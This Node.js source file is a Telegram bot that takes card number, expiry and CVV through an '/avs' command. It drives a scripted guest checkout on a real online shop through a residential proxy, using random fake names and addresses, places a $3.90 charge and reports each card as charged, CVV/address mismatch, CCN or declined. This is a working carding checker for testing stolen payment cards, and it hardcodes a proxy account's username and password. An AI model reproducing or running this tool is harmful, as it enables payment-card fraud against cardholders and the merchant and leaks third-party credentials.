const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const axios = require('axios');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

const app = express();
app.use(express.json());

const proxyConfig = {
    host: 'us-east.gw.rayobyte.com',
    port: 8000,
    auth: {
        username: 'tumaob1us_gmail_com-isp',
        password: 'Ntj9hnVhDb2B6vL4'
    }
};

const firstNames = ['Shawn', 'James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard'];
const lastNames = ['PHKHKKFG', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis'];
const addresses = [
    { addr: '13822 NE Airport Way', city: 'Portland', state: 'OR', zip: '97251-9614' },
    { addr: '1234 Market St', city: 'San Francisco', state: 'CA', zip: '94103' },
    { addr: '456 Ocean Drive', city: 'Miami', state: 'FL', zip: '33139' },
    { addr: '789 Broadway', city: 'New York', state: 'NY', zip: '10003' }
];

bot.onText(/\/avs (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const lista = match[1].trim();
    const startTime = Date.now();

    const parts = lista.split(/[:|]/);
    const cc = parts[0];
    let mes = parts[1];
    let ano = parts[2];
    const cvv = parts[3];

    if (ano.length === 4) {
        ano = ano.slice(2);
    }

    bot.sendMessage(chatId, `Tinitingnan ang card: ${lista} ...`);

    try {
        const jar = new CookieJar();
        const client = wrapper(axios.create({
            jar,
            proxy: proxyConfig,
            timeout: 20000,
            validateStatus: () => true
        }));

        const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
        
        let ip = 'Unknown';
        try {
            const ipRes = await client.get('https://api64.ipify.org/?format=json');
            ip = ipRes.data.ip || 'Unknown';
        } catch (e) {}

        const rfname = firstNames[Math.floor(Math.random() * firstNames.length)];
        const rlname = lastNames[Math.floor(Math.random() * lastNames.length)];
        const raddrInfo = addresses[Math.floor(Math.random() * addresses.length)];
        const remail = `shawn${Math.floor(Math.random() * 900 + 100)}@gmail.com`;
        const rphone = '971' + Math.floor(Math.random() * 900 + 100) + Math.floor(Math.random() * 9000 + 1000);

        await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/shop/dropper',
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest'
            }
        });

        await client.get('https://fireflyfuel.com/checkout', {
            headers: { 'referer': 'https://fireflyfuel.com/shop/dropper', 'user-agent': ua }
        });

        await client.post('https://fireflyfuel.com/checkout', `type=guest&guestEmail=${encodeURIComponent(remail)}&offers=1`, {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/checkout',
                'user-agent': ua
            }
        });

        const infoData = new URLSearchParams({
            'shipping[country]': 'US',
            'shipping[US][firstName]': rfname,
            'shipping[US][lastName]': rlname,
            'shipping[US][company]': '',
            'shipping[US][phone]': rphone,
            'shipping[US][address1]': raddrInfo.addr,
            'shipping[US][address2]': '',
            'shipping[US][city]': raddrInfo.city,
            'shipping[US][state]': raddrInfo.state,
            'shipping[US][zipcode]': raddrInfo.zip,
            'billing[sameAsShipping]': '1',
            'billing[country]': 'US',
            'billing[US][firstName]': rfname,
            'billing[US][lastName]': rlname,
            'billing[US][company]': '',
            'billing[US][phone]': rphone,
            'billing[US][address1]': raddrInfo.addr,
            'billing[US][address2]': '',
            'billing[US][city]': raddrInfo.city,
            'billing[US][state]': raddrInfo.state,
            'billing[US][zipcode]': raddrInfo.zip
        }).toString();

        await client.post('https://fireflyfuel.com/checkout/info', infoData, {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/checkout',
                'user-agent': ua
            }
        });

        await client.get('https://fireflyfuel.com/checkout/payment', {
            headers: { 'referer': 'https://fireflyfuel.com/checkout/info', 'user-agent': ua }
        });

        const paymentData = new URLSearchParams({
            'x_amount': '3.90',
            'x_order_id': '',
            'x_cust_id': '',
            'x_first_name': rfname,
            'x_last_name': rlname,
            'x_address': raddrInfo.addr,
            'x_city': raddrInfo.city,
            'x_state': raddrInfo.state,
            'x_zip': raddrInfo.zip,
            'x_phone': rphone,
            'x_email': remail,
            'x_country': 'US',
            'x_ship_to_first_name': rfname,
            'x_ship_to_last_name': rlname,
            'x_ship_to_address': raddrInfo.addr,
            'x_ship_to_city': raddrInfo.city,
            'x_ship_to_state': raddrInfo.state,
            'x_ship_to_zip': raddrInfo.zip,
            'x_ship_to_phone': rphone,
            'x_ship_to_country': 'US',
            'x_card_num': cc,
            'x_exp_date': `${mes}${ano}`,
            'x_card_code': cvv
        }).toString();

        const payRes = await client.post('https://fireflyfuel.com/checkout/run-payment.ajax', paymentData, {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/checkout/payment',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua
            }
        });

        const respData = payRes.data;
        const endTime = ((Date.now() - startTime) / 1000).toFixed(2);
        
        let msgResult = respData.messages ? respData.messages.replace(/<[^>]*>?/gm, '').trim() : JSON.stringify(respData);
        if (msgResult.length > 200) msgResult = msgResult.substring(0, 200) + '...';

        let finalResponse = `Card: ${lista}\n`;
        if (respData.result === 'success') {
            finalResponse += `STATUS: CHARGED ($3.90)\nOrder ID: ${respData.order_id || 'N/A'}\n`;
        } else if (msgResult.includes('Address provided does not match')) {
            finalResponse += `STATUS: CVV / Address Mismatch\n`;
        } else if (msgResult.includes('Invalid CVV') || msgResult.includes('Insufficient funds')) {
            finalResponse += `STATUS: CCN (${msgResult})\n`;
        } else {
            finalResponse += `STATUS: DECLINED\nReason: ${msgResult}\n`;
        }
        finalResponse += `Time: ${endTime}s | IP: ${ip}`;

        bot.sendMessage(chatId, finalResponse);

    } catch (error) {
        let errMessage = error.message;
        if (errMessage.length > 200) errMessage = errMessage.substring(0, 200) + '...';
        bot.sendMessage(chatId, `Error: ${errMessage}`);
    }
});

app.get('/', (req, res) => {
    res.send('Unified AVS Telegram Bot is running!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
